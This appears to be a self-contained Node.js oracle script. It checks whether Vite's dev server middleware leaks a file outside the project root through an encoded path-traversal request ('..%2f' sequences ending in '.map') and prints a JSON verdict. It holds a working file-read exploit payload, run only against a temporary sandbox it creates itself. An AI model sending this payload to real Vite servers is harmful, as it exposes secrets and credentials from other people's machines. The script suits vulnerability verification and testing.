const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') {
      throw new Error('vite.createServer is not available');
    }

    const marker = path.join(os.tmpdir(), 'vite-oracle-' + Date.now() + '-' + Math.random().toString(16).slice(2));
    const rootDir = path.join(marker, 'root');
    const outsideDir = path.join(marker, 'outside');
    const outsideFile = path.join(outsideDir, 'secret.txt');

    fs.mkdirSync(rootDir, { recursive: true });
    fs.mkdirSync(path.join(rootDir, 'node_modules', '.vite', 'deps'), { recursive: true });
    fs.mkdirSync(outsideDir, { recursive: true });

    fs.writeFileSync(path.join(rootDir, 'index.html'), '<!doctype html><html><body>ok</body></html>');
    fs.writeFileSync(path.join(rootDir, 'node_modules', '.vite', 'deps', 'safe.js.map'), '{"version":3,"file":"safe.js","sources":[],"names":[],"mappings":""}');
    fs.writeFileSync(outsideFile, 'TOP_SECRET_MARKER');

    const server = await vite.createServer({
      root: rootDir,
      logLevel: 'silent',
      server: { middlewareMode: true }
    });

    const runRequest = (url) => new Promise((resolve) => {
      const req = { method: 'GET', url, headers: {} };
      const chunks = [];
      const res = {
        statusCode: 200,
        headers: {},
        setHeader(name, value) { this.headers[String(name).toLowerCase()] = value; },
        getHeader(name) { return this.headers[String(name).toLowerCase()]; },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const k of Object.keys(headers)) this.setHeader(k, headers[k]);
          }
        },
        end(data) {
          if (data) chunks.push(Buffer.isBuffer(data) ? data : Buffer.from(String(data)));
          resolve({ statusCode: this.statusCode || 200, body: Buffer.concat(chunks).toString('utf8'), headers: this.headers });
        },
        write(data) {
          if (data) chunks.push(Buffer.isBuffer(data) ? data : Buffer.from(String(data)));
          return true;
        }
      };
      server.middlewares(req, res, () => {
        resolve({ statusCode: 404, body: '', headers: {} });
      });
    });

    try {
      const benign = await runRequest('/node_modules/.vite/deps/safe.js.map');
      if (benign.statusCode >= 400 || benign.body.indexOf('"version":3') === -1) {
        throw new Error('benign request failed: status=' + benign.statusCode + ' body=' + benign.body.slice(0, 120));
      }

      operation_completed = true;

      const maliciousPath = '/node_modules/.vite/deps/..%2f..%2f..%2f..%2foutside%2fsecret.txt.map';
      const malicious = await runRequest(maliciousPath);

      const leaked = malicious.body.includes('TOP_SECRET_MARKER');
      exploit_succeeded = leaked;
      evidence = 'benign_status=' + benign.statusCode + '; malicious_status=' + malicious.statusCode + '; leaked=' + leaked;
    } finally {
      await server.close();
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'exception=' + (err && err.message ? err.message : String(err));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();